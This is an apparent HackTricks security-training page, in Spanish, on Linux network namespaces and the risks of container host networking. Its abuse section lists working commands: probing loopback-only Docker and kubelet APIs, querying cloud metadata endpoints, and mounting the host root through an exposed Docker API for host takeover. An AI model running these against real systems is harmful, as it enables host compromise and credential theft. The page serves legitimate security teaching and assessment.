# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El network namespace aísla recursos relacionados con la red, como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas de firewall, sockets y el contenido de archivos como `/proc/net`. Por eso un contenedor puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

En términos de seguridad, esto importa porque el aislamiento de red es mucho más que el binding de puertos. Un network namespace privado limita lo que la workload puede observar o reconfigurar directamente. Una vez que ese namespace se comparte con el host, el contenedor puede de repente obtener visibilidad sobre listeners del host, servicios locales del host y puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un network namespace recién creado comienza con un entorno de red vacío o casi vacío hasta que se le adjuntan interfaces. Los container runtimes crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la workload tenga la conectividad esperada. En despliegues basados en bridge, esto normalmente significa que el contenedor ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, CNI plugins manejan la configuración equivalente para el networking de los Pod.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` es un cambio tan dramático. En lugar de recibir una pila de red privada preparada, la workload se une a la pila real del host.

## Laboratorio

You can see a nearly empty network namespace with:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y contenedores con network=host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor conectado a la red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo incluso antes de preguntar qué capacidades tiene el proceso.

## Uso en tiempo de ejecución

Docker y Podman normalmente crean un espacio de nombres de red privado para cada contenedor, a menos que se configuren de otra forma. Kubernetes suele asignar a cada Pod su propio espacio de nombres de red, compartido por los contenedores dentro de ese Pod pero separado del host. Los sistemas Incus/LXC también proporcionan aislamiento basado en espacios de nombres de red, con frecuencia con una mayor variedad de configuraciones de red virtual.

El principio común es que la red privada es el límite de aislamiento por defecto, mientras que usar la red del host es una exclusión explícita de ese límite.

## Misconfiguraciones

La misconfiguración más importante es simplemente compartir el espacio de nombres de red del host. A veces se hace por rendimiento, monitorización de bajo nivel o conveniencia, pero elimina uno de los límites más limpios disponibles para los contenedores. Los listeners locales del host pasan a ser alcanzables de forma más directa, los servicios localhost-only pueden volverse accesibles, y capacidades como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan ahora se aplican al propio entorno de red del host.

Otro problema es otorgar en exceso capacidades relacionadas con la red incluso cuando el espacio de nombres de red es privado. Un espacio de nombres privado ayuda, pero no hace inocuos los raw sockets ni el control avanzado de red.

## Abuso

En entornos con aislamiento débil, los atacantes pueden inspeccionar los servicios en escucha del host, acceder a endpoints de gestión vinculados solo al loopback, interceptar o interferir con el tráfico dependiendo de las capacidades y del entorno, o reconfigurar el enrutamiento y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar el movimiento lateral y el reconocimiento del plano de control.

Si sospechas que se está usando la red del host, comienza confirmando que las interfaces visibles y los listeners pertenecen al host en lugar de a una red de contenedor aislada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios accesibles solo por loopback suelen ser el primer descubrimiento interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si las network capabilities están presentes, verifique si el workload puede inspeccionar o alterar el stack visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En entornos cluster o cloud, el host networking también justifica una rápida recon local de metadata y servicios adyacentes al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Ejemplo completo: Host Networking + Local Runtime / Kubelet Access

Host networking no proporciona automáticamente root del host, pero a menudo expone servicios que están intencionalmente accesibles solo desde el propio nodo. Si uno de esos servicios está débilmente protegido, host networking se convierte en una ruta directa de privilege-escalation.

Docker API en localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del clúster o movimiento lateral si kubelet o agentes locales son alcanzables
- manipulación de tráfico o denial of service cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es averiguar si el proceso tiene una pila de red privada, qué rutas y listeners son visibles, y si la vista de red ya se asemeja a la del host antes incluso de que pruebes las capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Lo interesante aquí:

- Si el identificador del namespace o el conjunto de interfaces visibles se parece al del host, host networking ya puede estar en uso.
- `ss -lntup` es especialmente valioso porque revela listeners que sólo están en loopback y endpoints de gestión local.
- Las rutas, los nombres de interfaz y el contexto del firewall se vuelven mucho más importantes si `CAP_NET_ADMIN` o `CAP_NET_RAW` están presentes.

Al revisar un container, evalúa siempre el network namespace junto con el capability set. Host networking junto con capacidades de red potentes constituye una postura muy diferente a bridge networking con un capability set por defecto y limitado.
{{#include ../../../../../banners/hacktricks-training.md}}
